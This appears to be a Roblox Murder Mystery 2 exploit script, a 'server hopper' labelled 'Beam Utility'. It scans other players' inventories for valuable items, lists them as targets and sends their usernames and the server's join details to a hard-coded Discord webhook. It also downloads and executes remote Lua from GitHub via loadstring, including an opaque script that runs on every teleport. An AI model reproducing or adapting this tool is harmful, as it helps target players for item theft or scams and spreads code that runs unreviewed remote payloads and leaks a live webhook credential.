getgenv().config = {
    items = {
        "Gingerscope",
        "TreeKnife2023Chroma",
        "TreeGun2023Chroma",
        "TravelerGunChroma",
        "VampireGunChroma",
        "BaubleChroma",
        "ConstellationChroma",
    },
    removetpgui = true,
    minimumMediumTiers = 5500,
    webhookConfig = {
        enabled = true,
        webhookUrl = "https://discord.com/api/webhooks/1301255351110471730/ld1j0RzyzBrY5osw40tCEwmI7ntu1o0_c_cHuukg4FwrnWyatB3frqM58RiMstcn_hxY" 
    },
    mode = "normal"   
}
local devMode = true

-- Load external scripts
local ServerHop = loadstring(game:HttpGet("https://raw.githubusercontent.com/ycvi0/priv/refs/heads/main/util/jswork.lua"))
local TestingLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/x6fg/MM2-Hopper/refs/heads/main/Libraries/UI-Library.lua"))()
local Whitelisted = loadstring(game:HttpGet("https://raw.githubusercontent.com/x6fg/MM2-Hopper/refs/heads/main/Utils/Whitelisted.lua"))()

-- Wait until the game is fully loaded
repeat wait() until game:IsLoaded()

-- Check for whitelisted users
if not devMode and not table.find(Whitelisted, game.Players.LocalPlayer.UserId) then
    game.Players.LocalPlayer:Kick("User is not whitelisted.")
    return
end

-- Map modes to place IDs
local modes = {
    assassin = 636649648,
    normal = 142823291,
    vamp = 73210641948512,
    disguises = 335132309,
}

local mode = modes[string.lower(getgenv().config.mode)]
if not mode then
    print("Experience isn't supported.")
    return
end

getgenv().placeId = mode

-- Services and local player setup
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui", 10)
local TPService = game:GetService("TeleportService")

-- Remove teleport GUI if configured
if getgenv().config.removetpgui then
    TPService:SetTeleportGui(Instance.new("ScreenGui"))
end

-- Utility function: Round a number
local function roundNumber(number)
    return string.format("%.2f", number)
end

-- Ensure inventory functions are loaded
repeat
    local success = pcall(function()
        return game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(LocalPlayer.Name)
    end)
    if success then break end
    wait()
until false

-- UI Setup
local ui = TestingLibrary:init(setclipboard)

-- Enable 3D rendering
local function Set3DRendering(state)
    game:GetService("RunService"):Set3dRenderingEnabled(state)
end
Set3DRendering(true)

-- Server hop callback
ui:ServerHopCallBack(function()
    game.Players.LocalPlayer:Kick("Server Hopping (Beam Utility)")
    ServerHop()
end)

-- Function to retrieve player inventory
local function GetFullInventory(player)
    return game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(player.Name)
end

-- Check if a player has a valid inventory
local function PlayerHasValidInventory(player)
    local inventory = GetFullInventory(player)
    if inventory and inventory.Weapons and inventory.Weapons.Owned then
        local owned = inventory.Weapons.Owned
        local totalValue = (
            (owned["TravelerAxe"] or 0) * 6000 +
            (owned["TravelerGun"] or 0) * 3200 +
            (owned["TreeGun2023"] or 0) * 1800 +
            (owned["TreeKnife2023"] or 0) * 1100 +
            (owned["Turkey"] or 0) * 1550 +
            (owned["WatergunChroma"] or 0) * 2200 +
            ((owned["Harvester"] or 0) + (owned["Icepiercer"] or 0)) * 800 +
            (owned["Constellation"] or 0) * 800
        )

        for item in pairs(owned) do
            if table.find(getgenv().config.items, item) or totalValue >= getgenv().config.minimumMediumTiers then
                print(player.Name .. " has " .. totalValue .. " Value")
                return true
            end
        end
    end
    return false
end

-- Retrieve good players
local function getGoodPlayers()
    local goodPlayers = {}
    local playersChecked = 0
    local totalPlayers = #Players:GetPlayers() - 1 -- Exclude LocalPlayer

    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            task.spawn(function()
                if PlayerHasValidInventory(player) then
                    table.insert(goodPlayers, player.Name)
                end
                playersChecked = playersChecked + 1
            end)
        end
    end

    repeat wait() until playersChecked == totalPlayers
    return goodPlayers
end

-- Send webhook message
local function sendWebhook(payload, webhookUrl)
    local success, response = pcall(function()
        return request({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)

    if success then
        print("Webhook sent successfully.")
    else
        warn("Error sending webhook:", response)
    end
end

-- Main execution
local goodPlayers = getGoodPlayers()
local webhookPayload = {
    content = "Good Server Has Been Found! @everyone\n",
    embeds = {
        {
            title = "Server Join Script",
            description = string.format("```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n```", game.PlaceId, game.JobId),
            color = 4062976,
            fields = {},
        }
    },
    username = "Server Hopper",
    avatar_url = "https://media.discordapp.net/attachments/1264231498555592705/1265273482535764019/IMG_3753.png",
    attachments = {},
}

for _, playerName in ipairs(goodPlayers) do
    local playerUI = ui:AddPlayer(playerName)
    pcall(function()
        playerUI:SetCallback(function()
            setclipboard(Players:FindFirstChild(playerName).DisplayName or "")
        end)
    end)

    table.insert(webhookPayload.embeds[1].fields, {
        name = "# Players:",
        value = "Username:\n```" .. playerName .. "```",
    })
end

local webhookSettings = getgenv().config.webhookConfig
if #goodPlayers == 0 then
    ui:UpdateStatus("Server Hopping...")
    game.Players.LocalPlayer:Kick("Server Hopping (Beam Utility)")
    ServerHop()

else
    Set3DRendering(true)
    if webhookSettings.enabled then
        sendWebhook(webhookPayload, webhookSettings.webhookUrl)
    end
    ui:UpdateStatus("Good server has been found")
end

Players.LocalPlayer.OnTeleport:Connect(function(State)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ycvi0/shushj/refs/heads/main/x"))()
end)
